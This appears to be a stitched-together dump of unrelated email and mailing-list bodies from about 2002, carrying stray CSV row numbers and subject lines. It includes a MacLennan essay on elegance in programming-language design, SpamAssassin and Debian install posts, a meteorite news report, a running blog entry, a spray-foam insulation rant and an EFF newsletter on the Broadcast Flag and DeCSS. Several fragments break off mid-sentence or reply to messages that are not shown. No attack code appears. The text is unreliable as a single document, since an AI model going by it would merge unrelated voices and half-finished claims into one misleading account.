 - Win reviews. Software reviewers always cast about for some kind of 
 standardized way to rate software, even when they are comparing apples and 
 oranges and planets and 17th century philosophers. They always have a 
 meaningless list of things to review which can be applied to PC games, 
 mainframe databases, web site auction software, and DNA sequencing 
 software. And Setup is always on their list. A single flaw in setup is 
 guaranteed to be mentioned in every review because every reviewer will see it 
 and say ""Aha!""
 
 
 *""How can we make WISE[4] better?"" *Kudos to the product manager of WISE 
 Installation System for calling me up and listening to my litany of all the 
 reasons his product wasn't adequate for typical IIS/ASP/SQL applications.

 Done.
 Well, I feel especially sorry for him since he already qualified 0.11.28 of
 ""brown paper bag"" release because of the column header clicking bug :-((
 
 I'll put up the next version as soon as it's out hoping it'll fix all
 current issues!

 There are lots of benefits to using hard links, for all sorts of reasons. In
 this case, they are being used to provide two quite different namespaces
 for the same set of files.

 I had cited the information theoretic concept of ""elegance""
 in my dissertation & did a Google to find the reference and instead
 found a really great tech report for UoT Knoxville by Bruce
 MacLennan.  He cites Efficiency, Economy, and Elegance, but
 I think he's wrong.  The middle E should be Effectiveness. 
 Otherwise kudos.
 
 
 Efficiency is the relation of output to input effectiveness is
 the total output.  In information theory, something is both elegant
 and efficient if no smaller or less costly something can product the 
 same output in the same amount of time.

 The Value of Analogies
 
 Programming language design is a comparatively new activity - it has existed for less than half a century, so
 it is
 often worthwhile to look to older design disciplines to understand better this new activity. Thus, my book
 Principles of Programming Languages: Design, Evaluation, and Implementation, grew out of a study of teaching
 methods in architecture, primarily, but also of pedagogy in other disciplines, such as aircraft design.
 Perhaps you
 have also seen analogies drawn between programming languages and cars (FORTRAN = Model T, C = dune
 buggy, etc.). 
 
 These analogies can be very informative, and can serve as ``intuition pumps'' to enhance our creativity, but
 they
 cannot be used uncritically because they are, in the end, just analogies. Ultimately our design decisions must
 be
 based on more than analogies, since analogies can be misleading as well as informative. 
 
 In this essay I'll address the role of aesthetics in programming language design, but I will base my remarks
 on a
 book about structural engineering, The Tower and the Bridge, by David P. Billington. Although there are many
 differences between bridges and programming languages, we will find that many ideas and insights transfer
 rather
 directly. 
 
 According to Billington, there are three values common to many technological activities, which we can call
 ``the
 three E's'': Efficiency, Economy and Elegance. These values correspond to three dimensions of technology,
 which
 Billington calls the scientific, social and symbolic dimensions (the three S's). We will consider each in
 turn. 
 
 
 Efficiency Seeks to Minimize Resources Used
 
 In structural engineering, efficiency deals with the amount of material used; the basic criterion is safety
 and the
 issues are scientific (strength of materials, disposition of forces, etc.). Similarly, in programming language
 design,
 efficiency is a scientific question dealing with the use of resources. There are many examples where
 efficiency
 considerations influenced programming language design (some are reviewed in my Principles of Programming
 Languages). In the early days, the resources to be minimized were often runtime memory usage and processing
 time, although compile-time resource utilization was also relevant. In other cases the resource economized was
 programmer typing time, and there are well-known cases in which this compromised safety (e.g. FORTRAN's
 implicit declarations). There are also many well-known cases in which security (i.e. safety) was sacrificed
 for the
 sake of efficiency by neglecting runtime error checking (e.g. array bounds checking). 
 
 Efficiency issues often can be quantified in terms of computer memory or time, but we must be careful that we
 are
 not comparing apples and oranges. Compile time is not interchangeable run time, and neither one is the same as
 programmer time. Similarly, computer memory cannot be traded off against computer time unless both are
 reduced to a common denominator, such as money, but this brings in economic considerations, to which we now
 turn. 
 
 
 Economy Seeks to Maximize Benefit versus Cost
 
 Whereas efficiency is a scientific issue, economy is a social issue. In structural engineering, economy seeks
 to
 maximize social benefit compared to its cost. (This is especially appropriate since structures like bridges
 are
 usually built at public expense for the benefit of the public.) In programming language design, the ``public''
 that
 must be satisfied is the programming community that will use the language and the institutions for which these
 programmers work. 
 
 Economic tradeoffs are hard to make because economic values change and are difficult to predict. For example,
 the shift from first to second generation programming languages was largely a result of a decrease in the cost
 of
 computer time compared to programmer time, the shift from the second to the third generation involved the
 increasing cost of residual bugs in programs, and the fourth generation reflected the increasing cost of
 program
 maintenance compared to program development. 
 
 Other social factors involved in the success or failure of a programming language include: whether major
 manufacturers support the language, whether prestigious universities teach it, whether it is approved in some
 way
 by influential organizations (such as the US Department of Defense), whether it has been standardized, whether
 it
 comes to be perceived as a ``real'' language (used by ``real programmers'') or as a ``toy'' language (used by
 novices
 or dilettantes), and so forth. As can be seen from the historical remarks in my Principles, social factors are
 frequently more important than scientific factors in determining the success or failure of a programming
 language. 
 
 Often economic issues can be quantified in terms of money, but the monetary values of costs and benefits are
 often
 unstable and unpredictable because they depend on changing market forces. Also, many social issues, from
 dissatisfaction with poorly designed software to human misery resulting from system failures, are inaccurately
 represented by the single dimension of monetary cost. All kinds of ``cost'' and ``benefit'' must be considered
 in
 seeking an economical design. 
 
 
 Elegance Symbolizes Good Design
 
 ``Elegance? Who cares about elegance?'' snorts the hard-nosed engineer, but Billington shows clearly the
 critical
 role of elegance in ``hard-nosed'' engineering. 
 
 For the Designer
 
 It is well-known that feature interaction poses a serious problem for language designers because of the
 difficulty
 of analyzing all the possible interactions of features in a language (see my Principles for examples).
 Structural
 engineers face similar problems of analytic complexity, but Billington observes that the best designers don't
 make
 extensive use of computer models and calculation. 
 
 One reason is that mathematical analysis is always incomplete. The engineer must make a decision about which
 variables are significant and which are not, and an analysis may lead to incorrect conclusions if this
 decision is not
 made well. Also, equations are often simplified (e.g., made linear) to make their analysis feasible, and this
 is
 another potential source of error. Because of these limitations, engineers that depend on mathematical
 analysis
 may overdesign a structure to compensate for unforeseen effects left out of the analysis. Thus the price of
 safety is
 additional material and increased cost (i.e. decreased efficiency and economy). 
 
 Similarly in programming language design, the limitations of the analytic approach often force us to make a
 choice between an under-engineered design, in which we run the risk of unanticipated interactions, and an
 over-engineered design, in which we have confidence, but which is inefficient or uneconomical. 
 
 Many people have seen the famous film of the collapse in 1940 of the four-month-old Tacoma Narrows bridge; it
 vibrated itself to pieces in a storm because aerodynamical stability had not been considered in its design.
 Billington explains that this accident, along with a number of less dramatic bridge failures, was a
 consequence of
 an increasing use of theoretical analyses that began in the 1920s. However, the very problem that destroyed
 the
 Tacoma Narrows bridge had been anticipated and avoided a century before by bridge designers who were guided
 by aesthetic principles. 
 
 According to Billington, the best structural engineers do not rely on mathematical analysis (although they do
 not
 abandon it altogether). Rather, their design activity is guided by a sense of elegance. This is because
 solutions to
 structural engineering problems are usually greatly underdetermined, that is, there are many possible
 solutions to a
 particular problem, such as bridging a particular river. Therefore, expert designers restrict their attention
 to
 designs in which the interaction of the forces is easy to see. The design looks unbalanced if the forces are
 unbalanced, and the design looks stable if it is stable. 
 
 The general principle is that designs that look good will also be good, and therefore the design process can
 be
 guided by aesthetics without extensive (but incomplete) mathematical analysis. Billington expresses this idea
 by
 inverting the old architectural maxim and asserting that, in structural design, function follows form. He adds
 (p.
 21), ``When the form is well chosen, its analysis becomes astoundingly simple.'' In other words, the choice of
 form is open and free, so we should pick forms where elegant design expresses good design (i.e. efficient and
 economical design). If we do so, then we can let aesthetics guide design. 
 
 The same applies to programming language design. By restricting our attention to designs in which the
 interaction
 of features is manifest - in which good interactions look good, and bad interactions look bad - we can let our
 aesthetic sense guide our design and we can be much more confident that we have a good design, without having
 to
 check all the possible interactions. 
 
 For the User
 
 In this case, what's good for the designer also is good for the user. Nobody is comfortable crossing a bridge
 that
 looks like it will collapse at any moment, and nobody is comfortable using a programming language in which
 features may ``explode'' if combined in the wrong way. The manifest balance of forces in a well-designed
 bridge
 gives us confidence when we cross it. So also, the manifestly good design of our programming language should
 reinforce our confidence when we program in it, because we have (well-justified) confidence in the
 consequences
 of our actions. 
 
 We accomplish little by covering an unbalanced structure in a beautiful facade. When the bridge is unable to
 sustain the load for which it was designed, and collapses, it won't much matter that it was beautiful on the
 outside.
 So also in programming languages. If the elegance is only superficial, that is, if it is not the manifestation
 of a
 deep coherence in the design, then programmers will quickly see through the illusion and loose their
 (unwarranted)
 confidence. 
 
 In summary, good designers choose to work in a region of the design space where good designs look good. As a
 consequence, these designers can rely on their aesthetic sense, as can the users of the structures (bridges or
 programming languages) they design. We may miss out on some good designs this way, but they are of limited
 value unless both the designer and the user can be confident that they are good designs. We may summarize the
 preceding discussion in a maxim analogous to those in my Principles of Programming Languages: 
                                 The Elegance Principle
 
               Confine your attention to designs that look good because they are good. 
 
 
 
 The Programming Language as Work Environment
 
 There are other reasons that elegance is relevant to a well-engineered programming language. The programming
 language is something the professional programmer will live with - even live in. It should feel comfortable
 and
 safe, like a well-designed home or office; in this way it can contribute to the quality of the activities that
 take
 place within it. Would you work better in an oriental garden or a sweatshop? 
 
 A programming language should be a joy to use. This will encourage its use and decrease the programmer's
 fatigue
 and frustration. The programming language should not be a hindrance, but should serve more as a collaborator,
 encouraging programmers to do their jobs better. As some automobiles are ``driving machines'' and work as a
 natural extension of the driver, so a programming language should be a ``programming machine'' by encouraging
 the programmer to acquire the smooth competence and seemingly effortless skill of a virtuoso. The programming
 language should invite the programmer to design elegant, efficient and economical programs. 
 
 Through its aesthetic dimension a programming language symbolizes many values. For example, in the variety of
 its features it may symbolize profligate excess, sparing economy or asceticism; the kind of its features may
 represent intellectual sophistication, down-to-earth practicality or ignorant crudeness. Thus a programming
 language can promote a set of values. By embodying certain values, it encourages us to think about them; by
 neglecting or negating other values, it allows them to recede into the background and out of our attention.
 Out of
 sight, out of mind. 
 
 
 Acquiring a Sense of Elegance
 
 Aesthetics is notoriously difficult to teach, so you may wonder how you are supposed to acquire that refined
 sense
 of elegance necessary to good design. Billington observes that this sense is acquired through extensive
 experience
 in design, which, especially in Europe, is encouraged by a competitive process for choosing bridge designers.
 Because of it, structural engineers design many more bridges than they build, and they learn from each
 competition they loose by comparing their own designs with those of the winner and other losers. The public
 also
 critiques the competing designs, and in this way becomes more educated; their sense of elegance develops along
 with that of the designers. 
 
 So also, to improve as a programming language designer you should design many languages - design obsessively -
 and criticize, revise and discard your designs. You should also evaluate and criticize other people's designs
 and try
 to improve them. In this way you will acquire the body of experience you will need when the ``real thing''
 comes
 along.

 I just checked out b2_4_0 from CVS and 'make test' fails horribly.
 
 It seems to be looking in my site_perl SpamAssassin code, not the build
 directory.

 Yes it does. And if you're missing the dependencies needed for the selected
 options, you'll even be informed! (for ALSA, you'll need alsa-lib-devel for
 example)

 Yup... unfortunately the alsa-kernel needs to be rebuilt for each kernel,
 and there's no way of avoiding it.

 Spammers fall into two categories. The more
 difficult case are those whose back-end business
 can be executed entirely in a foreign nation, such
 as the 419 spammers. And you're right: there's not
 much we can do about those, except filter them in
 various ways. But the vast majority of spammers
 have a back-end business that requires a native
 presence. Debt consolidation. Mortgages. Herbalife
 and other MLMs. Even porn sites require credit
 card transactions. That means the people responsible
 CAN be found.
 
 >I don't know of any law that specifically /exempts/ them from lawsuits, 
 >it's just that no one has yet succeeded in any important way.
 
 There have been some successful suits, but (a) it
 takes too much effort, and (b) the result isn't enough
 to deter the spammer. But you're talking about action
 constrained by law. In an anarchy, people act more
 directly, with less cost, and to more effect. Spammers
 very quickly would learn their lesson. Except for the
 ones who ply their scam in a foreign country.
 
 Of course, that's assuming there are ISPs and other
 infrastructure in an anarchy. Arguing about how things
 would work without the state involves a large degree
 of counterfactual reasoning.

 Hmm. I've lived most of my life in houses that did
 not have central heating, including my current abode.
 As to the crapper, it did not do nearly as much to
 improve waste management in cities as did the public
 sewers which it feeds, and the water lines that supply
 it. Without these, you would find that a chamber pot
 works just as well.

","http://yorkshirepost.co.uk/scripts/editorial2.cgi?cid=news&aid=481620
 
 Close encounter of burnt kind
 
 IT came from outer space  or did it? Teenager Siobhan Cowton is convinced
 the object which struck her as she climbed into the family car at her home
 in Northallerton is extra-terrestrial.
 But while her claims are being treated with a certain amount of studied
 academic scepticism by experts in these matters, the 14-year-old schoolgirl
 is adamant she was hit on the foot by a meteorite.
 Siobhan initially thought there was a more prosaic explanation  that the
 odd-looking stone had been thrown at her by a child,.
 But on closer inspection, she discovered all was not as it seemed  because
 it was hot when she picked it up. It hit her on a foot but caused no injury.
 ""I looked at it again and it had a black and grey colour with a shiny bubble
 surface,"" she said.
 After closer inspection by her father Niel, and comparison with pictures on
 the Internet, Siobhan plans to ask scientists at Durham University to check
 the object for authenticity.
 If it is from outer space, Siobhan says she will consider putting it up for
 auction.
 She added: ""If it isn't worth anything then I suppose I will keep it myself
 for sentimental value. It is not every day that you are hit by a meteorite.""
 But Dr Ben Horton, a lecturer in physical geography, was the acme of
 academic caution.
 ""Meteors have features that can be used to establish whether it is a piece
 of extraterrestrial rock,"" he said.
 ""They have a very smooth surface but sometimes they have shallow depressions
 and cavities. If they are hot, they should have a black ash like crust burnt
 around the edge.
 ""Most are between five and 60 centimetres but five centimetres is the
 smallest that they usually appear.""
 To establish the provenance of Siobhan's suspected meteorite it would have
 to be subject to a mineral breakdown but Dr Horton thinks the chances of it
 being extra-terrestrial are slim.
 ""Around 50,000 a year strike the Earth's surface and, considering the size
 of the Earth, it is very unlikely to be a meteorite.
 ""However, there is a possibility and there is no reason it couldn't happen,""
 he added.

 Back when 64KB was more memory than any computer would ever need, there was a 
 time when memory managers didnt exist. But gradually, new computer systems 
 came out with larger amounts of memory and designers discovered ways to eat up 
 RAM faster than any system could dish it out. This discussion is based on 
 Tiburon's experiences in writing and rewriting the memory manager for Madden 
 NFL 97 to Madden NFL 2002.

 Wow. I think a majority of the anti-spam community out there would disagree
 with you. It makes no difference what the list is, whether it's run by ZDNet
 or Empire Towers, whether it uses open proxies and relays or a MLM like
 mailman or Lyris. In either case I was added to a list against my will to

 to 'unsubscribe' from some viagra spam. Or are you advocating that as well?

 That's fine. But my point is that neither person in my example was
 committing an inherently untrustworthy act. Yet someone's TES would likely
 fall because of it.

 Hmm. Good point about razor-whitelist. I'd forgotten about that.

 Ahm, if you don't object to using a mouse for such things, exmh has 
 the ability to insert different sigs on demand.  Create a bunch of 
 different sig files, all beginning with .signature, and at start up, 
 exmh will load them all.  In the Sedit window, you'll see a Sign...
 menu item which will allow you to select between each of the listed 
 .signature files for *that* e-mail.  You can actually use several if 
 you'd like (though I don't remember what Preferences... option allows 
 for this).
 
 However, the signature gets added on send, not inserted directly into 
 the existing Sedit window prior to composition.
 
 I currently have 6 different sig files I can choose between.
 
 Additionally, if a .signature file has the execute bit turned on, 
 exmh will attempt to execute the file and use the stdout of the 
 script as your signature.
 
 I hope this helps some.

 You're a bit too vague on your ""[rpm package]"" here...

 Date: 2002-10-09T19:54:41-05:00
 
 Actually, 5.6. I clocked my &#8220;long loop&#8221; today and discovered that 
 the run I thought was 6 miles is actually only 5.6. And the &#8220;short 
 loop&#8221; I thought was 5 miles is actually only 4.6. I have an off-by-0.4 
 bug. This is very upsetting. I've lost 0.4 miles somewhere. If anyone finds 
 them, can you please let me know? Thank you. 
 
 I ran 9 miles last week, and 10 so far this week, even taking into account my 
 off-by-0.4 bug. I fear I am turning into a runner. My father and I made fun of 
 runners when I was growing up. He used to say that you never saw a runner 
 smiling. We'd drive by runners, point at them, and say, &#8220;Look, another 
 runner... not smiling!&#8221; This weighed heavily on my psyche in my formative 
 years. So it is with some measure of shame that I admit that I am becoming a 
 runner. 
 
 Becoming a runner is actually not that difficult. Not surprisingly, it involves 
 running. There's other stuff, too, eventually, but running is the important 
 part. If you can run a mile, run a mile. If you can only run around the block, 
 run around the block. Tomorrow you'll run around the block, and the next day 
 you'll find you can run around two blocks. And next week you'll find you can 
 run a mile. Then one day you'll run a mile, then stop to catch your breath, 
 then get invigorated and run another mile. 
 
 And then you're a runner. That's it, really. It's not complicated. You run, and 
 you run, and you run. And one day, you discover that shoes are important, and 
 that the old sneakers you threw on the first time you tried out this running 
 thing out aren't actually very good for running. So you go buy new shoes, and 
 you run, and you run, and you run. And later, you discover that stretching is 
 important too, so you stretch and run, and stretch and run, and stretch and 
 run. 
 
 There's other stuff too, but it doesn't really matter until you're already a 
 runner. You learn about differences in running surfaces. And how many miles you 
 should really put on one pair of shoes. And when in the day you should run to 
 maximize calorie burning. And how to train for a marathon, and so forth. Don't 
 worry about any of that now. Just run. Running is key. Otherwise you're just 
 another fat schmuck lying on the couch reading _Runner's World_.

 If there's any sanity in the world, even the original poster would be glad
 to have his kneejerk response blocked <wink>.  OTOH, you know there are a
 great many msgs on c.l.py (all over Usenet) that do nothing except quote a
 previous post and add a one-line comment.  Remove the quoted sections from
 those, and there may be no content left to judge except for the headers.  So
 I can see this nudging the stats in either direction.  The only way to find
 out for sure is for you to write some code <wink>.

944,"Subject: RE: [Baseline] Raising chickens the high-tech way
","My take: if genetic engineering includes selective breeding, then it
 also includes human pairs that are not randomly grouped.
 
 It doesn't matter if those two intend what they are doing, they are
 engaged in a 'selected sort'.  It has been brought up that a boss no
 longer marries his secretary.  Now the female law partner selects
 another high earning mate (at least associate law).  So instead of two
 couples making $140K a piece (100K + 40K) you have one pair with $200
 and one pair with $80 and this has some interesting social effects.  And
 one of those effects is the difference in their children (on average).

 uh, i wouldn't.  i was referring to the previous message which discussed

 yes.  i did fail to mention that floyd might not use inode 111, but
 it might.  and that was my point, having these mythical symlinks point
 to the device+inode is not simple.  just like the unrm thing, it might
 be possible, but hard links and soft links are the best implementations
 that have survived to date on unix.  windows shortcuts are kinda weird -
 they're really an application level thing.
 
 mac aliases seem to take the idea of unix symlinks (linking by filename)
 along with the concept of device+inode.  i don't know mac internals,
 but i seem to remember being told it tried the former first, and then
 tried the latter.  how it would deal with the 2nd example i mentioned i
 dunno - i'm not certain if the mac version of inodes would suffer from
 that (maybe the fs identifier for the file included the creation time
 or something like that).
 
 > how do i control this 'symlinks magically link to new files' feature?
 
 i think it would be difficult.  it would also fail to work in numerous
 situations.

","Because of this:
 http://hrw.org/press/2002/08/yahoo080902.htm
 there are several of us who are in the BDSM lifestyle who are trying to 
 encourage our local groups to find alternatives to yahoo groups as a way 
 of communicating with each other.  I've set up a place to have maillists 
 on my server for any group who wants to use it, but I was wondering if 
 anyone knows of an alternative that allows all the bells and whistles that 
 yahoo has, such as reminders, file storage, calendars, etc.  Anyone?
 TIA,
 Cindy

 I got the DSL-W 906E from http://www.dsl-warehouse.co.uk.
 
 Though it's not at all the best one around I have to say it does the job
 and a bit. Some of the features can be a pain to get working (ie. pptp in
 pppoe mode - can't figure it out). The documentation is not the best, but
 the guys from http://www.dsl-warehouse.co.uk will help you ouit. They
 also have a message board.
 
 The command line interface is quite powerful, but absolutely not
 userfriendly.
 
 All in all it's a cheap desent performer, that I am happy enough with.
 Got this one including a microfilter (not needed) for 140euro including
 shipping. Better than any deal from Eircom.

 The impression I get from reading lkml the odd time is
 that IDE has gone downhill since Andre Hedrick was 
 effectively removed as maintainer. Martin Dalecki seems
 to have been unable to further development without 
 much breakage. However, this is part of the fun of
 the development kernel. Alan and others are annoyed
 because they can't do any development themselves while
 IDE is broken. Hopefully the 2.4 IDE port should help.

 <P class=arial style=""MARGIN: 0in 0in 0pt"">It would be much more useful to the industry, if SPFA would help find a ""CODE CONFORMING"" fire barrier for attics, crawl spaces etc., than&nbsp; lecture on Fast and Loose applications of code.&nbsp; Something about 30 cents (a BD. FT.) installed, meeting All codes and spray applied. Many companies we talk to have a product that appears to be perfect BUT they haven't spent the money to test over foam. Maybe a small committee could do a evaluation of various products, report results to SPFA, who in turn will ""acquire funding"" from US.</P>

 <P class=arial style=""MARGIN: 0in 0in 0pt"">I'm sick of all this garbage about covering foam with a ""thermal Barrier"". What the hell do you think foam is? If you are saying that anything that can be FORCED to burn should be covered with a FIREPROOF barrier, then you'd better get busy covering all those trusses and joists and plywood up there that are definitely NOT carrying a class one fire rating. This double standard for foam is coming directly from those who stand to lose business from it. Icynene is DIFFERENT.&nbsp; IT DOESN'T BURN ALONE. IT DOESN'T MELT. IT DOESN'T EMIT PHOSGENE. Does it smoke in a fire situation? Sure, so what?</P>
 <P class=arial style=""MARGIN: 0in 0in 0pt""><BR>Blaming foam in the attic for a house fire because it forces the foam to eventually burn is about as stupid as blaming foam seat cushions for burning when a gas tank ruptures and burns up a car. Get real, inspectors. You want us to cover up the only thing in the attic assembly that DOESN'T BURN!<BR>&nbsp;</P>
 <P class=arial style=""MARGIN: 0in 0in 0pt"">As for the vaunted R rating system, IT IS TOTALLY BOGUS. The test is designed to make porous insulations APPEAR to perform better than they actually do.&nbsp; Measuring only conduction and ignoring convection and radiant to convective transfer, the test should have been thrown out for the industry lackey it is 20 years ago, along with that obsolete fiberglass<BR>garbage they're still selling everybody.&nbsp; There's a reason they don't make refrigerators, freezers coolers &amp; coffee cups out of fiberglass or cellulose.&nbsp;&nbsp; Think about it.</P>

955,"Subject: RE: [SAtalk] Debianized Packages for SA 2.3+
","I successfully installed spamassassin & razor to run system wide on my
 Debian Woody server.  
  
 Briefly I 
 apt-get installed spamassassin razor and libmilter-dev,
  
 downloaded spamass-milter-0.1.2.tar.gz from http://www.milter.org,
 ungzipped and untarred the file into /etc/mail, 
  
 followed the directions in /etc/mail/spamass-milter-0.1.2/README to
 compile the milter, install the rc scripts, and edit and update
 sendmail.mc
  
 changed /etc/default/spamassassin to set spamassassin to daemon mode.
  
 verified that spamassassin was running by tailing /var/log/mail.log
  
  
 Woody/stable has SA 2.20
 Woody/unstable has SA 2.41
 
 I'm running the stable source live right now and it is working very
 well.
 
 If you want unstable change /etc/apt/sources.list, substituting
 ""unstable"" for ""stable"",
 Run apt-get update
 Install the unstable versions
 Change /etc/apt/sources.list
 Run apt-get update

 Im currently using woody.
 
 Is there a debianized package for SA on Woody, or at least somewhere I
 can download from? Its been soo long that I haven't compiled stuff, that
 Im sort of shy to try again. =)

 Just one more info. I measured the time spent wrapping the stuff in 
 Ftoc_Next with time {} so the data is for real. One difference 
 between mine and Valdis' setup (judging from his trace) is that I use 
 the address book. I've been doing that for ages so that can't be the 
 problem.
 
 Is there a way to get the log to print time with higher granularity?

 * EFF Submits Letter to FCC Chairman Regarding BPDG Proposal
 
 The Honorable Michael K. Powell Chairman Federal Communications
 Commission 445 12th Street, S.W. Suite 8C453 Washington, DC 20554
 
 
 BY FACSIMILE, ELECTRONIC MAIL, AND POSTAL MAIL
 
 Dear Chairman Powell:
 
 I am writing to you today in regards to the digital television
 Broadcast Flag; specifically, I write in response to Sen. Hollings'
 and Representatives Dingell and Tauzin's letters of July 19, which
 urged you to mandate the Broadcast Flag proposal outlined in the
 final report of the Broadcast Protection Discussion Group.
 
 The Electronic Frontier Foundation (EFF) is a donor-supported
 non-profit organization that works to uphold civil liberties
 interests in technology policy and law. EFF has played a critical
 role in safeguarding crucial freedoms related to computers, the
 Internet and consumer electronics devices, defeating the restriction
 on strong cryptography exports; securing the legal principle that
 Internet wiretaps must only proceed in conjunction with a warrant;
 and defending academics, researchers and commercial interests
 against DMCA-related prosecution.
 
 EFF was an active participant in the Broadcast Protection Discussion
 Group. We attended the group's meetings and conference calls and
 participated in the group's policy and technical mailing-lists. EFF
 also maintains a web-site that was and is the only public source of
 information on the Broadcast Flag negotiations and proposal. The
 site can be found at http://bpdg.blogs.eff.org. EFF devoted
 thousands of staff-hours to publicizing the existence and nature of
 the BPDG to the public, to civil liberties and consumer-advocacy
 groups, and to entrepreneurial companies and software authors whose
 products were threatened by the proceedings.
 
 When you and I met at Esther Dyson's PC Forum last March, we spoke
 briefly about the civil liberties interests that would be undermined
 by the Broadcast Protection Discussion Group's mandate. The BPDG
 proposal will have grave consequences for innovation, free
 expression, competition and consumer interests. Worst of all, it
 will add unnecessary complexity and expense to the DTV transition,
 compromising DTV adoption itself.
 
 As you are aware, technologists have traditionally manufactured
 those devices they believed would be successful in the market, often
 in spite of the misgivings of rights-holders. From the piano roll to
 the PVR, technologists have enjoyed the freedom to ship whatever
 products they believe the public will pay for; what's more,
 innovation has always thrived best where there were the fewest
 regulatory hurdles. NTSC tuners and devices are governed by precious
 few regulations, and consequently we see a rich field of products
 that interact with them, from the VCR Plus to tuner-cards for PCs to
 the PVR. The Broadcast Flag proposal would limit technologists to
 shipping those products that met with the approval of MPAA member
 companies. No entrepreneur or software author will know, a priori,
 whether his innovative DTV product will be legal in the market until
 he has gone to the expense of building it and taking it around to
 the Hollywood studios for review.
 
 Consumers and industry alike have benefitted greatly from the ""Open
 Source"" or ""Free Software"" movement, in which technologies are
 distributed in a form that encourages end-user modification. From
 server-software like the web-wide success-story apache, to operating
 systems like GNU/Linux, to consumer applications like the Mozilla
 browser, Free Software is a powerful force for innovation, consumer
 benefit and commercial activity. The BPDG proposal implicitly bans
 Free Software DTV applications -- such as the DScaler de-interlacer
 and the GNU Radio software-defined radio program -- as these
 applications are built to be modified by end-users, something that
 is banned under the BPDG proposal. The tamper-resistance component
 of the BPDG's ""Robustness Requirements"" will create and entire class
 of illegal software applications, abridging the traditional First
 Amendment freedom enjoyed by software authors who create expressive
 speech in code form under one of several Free Software/Open Source
 licenses.
 
 The BPDG nominally set out to create an objective standard, a bright
 line that technologists could hew to in order to avoid liability
 when deploying their products. However, the end product of the BPDG
 was a ""standard"" that contained no objective criteria for legal
 technology; rather, the standard required that new technologies be
 approved by MPAA member companies. Not uncoincidentally, the only
 technologies that were approved by the MPAA -- and hence the only
 legal technologies -- were those produced by the 4C and 5C
 consortia, a group of technology companies that acted as the MPAA's
 allies throughout the BPDG process. This is an harbinger of the sort
 of regime that the BPDG standard will usher in: technology companies
 will be able to shut their competitors out of the marketplace by
 allying themselves with Hollywood, brokering deals to allow certain
 technologies and outlaw others.
 
 The marketplace is a proven mechanism for rapidly and efficiently
 producing products that increase the value and desirability of new
 technologies, such as DTV. A BPDG mandate would subvert the market
 for DTV innovation. Competing companies with lower-cost DTV
 technology alternatives would be restrained from bringing these to
 market if they failed to assuage the MPAA's concerns about
 unauthorized redistribution. Furthermore, the universe of
 unauthorized-but-lawful uses for DTV programming will be shrunk down
 to the much smaller space of explicitly authorized uses. The ability
 of the public to make unauthorized-but-lawful uses of television
 programming has been an historical force for increasing the value of
 broadcast programming, from the VCR to the PVR.
 
 Ironically, the inevitable damage that a Broadcast Flag mandate
 would do to innovation, competition and consumer interests can only
 slow down DTV adoption, by driving up the cost of DTV devices while
 reducing the number of desirable features that an open market would
 create. If the public is offered less functionality for more money,
 they will not flock to DTV.
 
 The most disheartening thing about the Broadcast Flag is that there
 is neither a strong case that the Broadcast Flag is a necessary tool
 for protecting copyright, nor that the Broadcast Flag would be
 effective in that role. The existing practice of Internet
 infringement of broadcast programming -- analog captures from
 devices that satisfy the requirements of the BPDG proposal -- would
 not be stopped by the presence of a Broadcast Flag.
 Higher-resolution DTV signals will likewise present no challenge to
 determined infringers, who can capture full-quality analog signal
 from DTV devices and then re-digitize them, suffering only a single
 generation's worth of loss-of-quality before the programming enters
 the Internet.
 
 Meanwhile, the underlying rubric for a Broadcast Flag -- that
 infringement will undermine Hollywood's business to the point that
 movies will no longer be available to the public, reducing the value
 of DTV -- is no more than superstition. No credible study or
 analysis, undertaken by a neutral party, has ever been presented to
 Congress, the FCC, the CPTWG or the BPDG supporting this notion. The
 public is being asked to sacrifice its rights in copyright; industry
 is being asked to place its right to innovation in the hands of
 entertainers; the US government is being asked to mandate
 extraordinary, unprecedented regulation of the $600 billion
 technology sector -- all on the uncorroborated opinions of a few
 studio executives.
 
 EFF welcomes the FCC's oversight of the Broadcast Flag issue. The
 BPDG proceedings took place behind a shroud of secrecy, in a
 looking-glass ""public process"" where only those participants the
 organizers wanted to hear from were made privy to its existence,
 where the co-chairs invented rules and processes on the fly to suit
 the needs of the entertainment interests and the technology
 companies that had privately secured a promise of a legal monopoly
 for their products, where the press was banned.
 
 The FCC has an admirable tradition of seeking and weighing public
 opinion in its proceedings. As the FCC considers the Broadcast Flag,
 EFF hopes that it will start anew, setting aside the findings of the
 BPDG in light of the concerns raised by Microsoft, Philips, Sharp,
 Thomson, and Zenith, as well as non-profit organizations including
 EFF, Consumers Union, Consumer Federation of America, the Free
 Software Foundation, Public Knowledge, digitalconsumer.org, the
 Center for Democracy in Technology, and the Computer and
 Communications Industry Association.
 
 Thank you for attention in this matter. Please let me know if we can
 be of any further assistance to you.
 
 Sincerely yours,
 
 Cory Doctorow for the Electronic Frontier Foundation

 * Update on Intel Corp. v. Hamidi
 
 Intel Corp. v. Hamidi is now on appeal to the California Supreme
 Court. EFF filed an amicus brief in support of Ken Hamidi on Aug. 6,
 2002. The facts are simple: Over about two years, Hamidi on six
 occasions sent e-mail critical of Intel's employment practices to
 between 8,000 and 35,000 Intel employees. Intel demanded that Hamidi
 stop, but he refused. Intel obtained an injunction barring Hamidi
 from e-mailing Intel employees at their Intel e-mail addresses,
 based on the common-law tort of ""trespass to chattels."" (""Chattel""
 is a legal term that refers to personal property, as opposed to
 property in land.)
 
 EFF's amicus brief argues three main points.
 
 (1) Intel did not qualify for relief under ""trespass to chattels""
 because Intel's e-mail servers were not themselves harmed by
 Hamidi's e-mails. If Intel was harmed, it was because the content of
 Hamidi's e-mails affected Intel employees, not because sending the
 e-mails affected the functioning of Intel's servers.
 
 (2) By focusing on unwanted ""contact"" with the chattel and ignoring
 the harm requirement, the court of appeal turned ""trespass to
 chattels"" into a doctrine that threatens common Internet activity
 like search engines and linking. For example, if a website posted a
 ""no trespassing"" sign, any ""contact"" by a search engine could be
 considered a trespass even if it caused no harm.
 
 (3) The court of appeal wrongly held that the injunction did not
 infringe Hamidi's freedom of speech. The First Amendment limits
 private parties' legal remedies in many areas of law, such as libel,
 out of concern that private parties will use the law to suppress
 criticism. The same principle should apply here, where Intel's
 claims of harm stem from the meaning of Hamidi's speech.

 * DeCSS Author Johansen's Trial Rescheduled
 
 The trial of Norwegian teen Jon Johansen, who created the
 controversial DeCSS software, has been pushed back again. It is now
 scheduled to be heard on December 9, 2002, in Oslo, Norway. In the
 fall of 1999, Johansen and his team reverse-engineered the content
 scrambling system (CSS) software used to encrypt DVDs in an effort
 to build a DVD player for the Linux operating system. In January of
 2002, the Norwegian Economic Crime Unit (OKOKRIM) charged Johansen
 with a violation of Norwegian Criminal Code Section 145.2, which
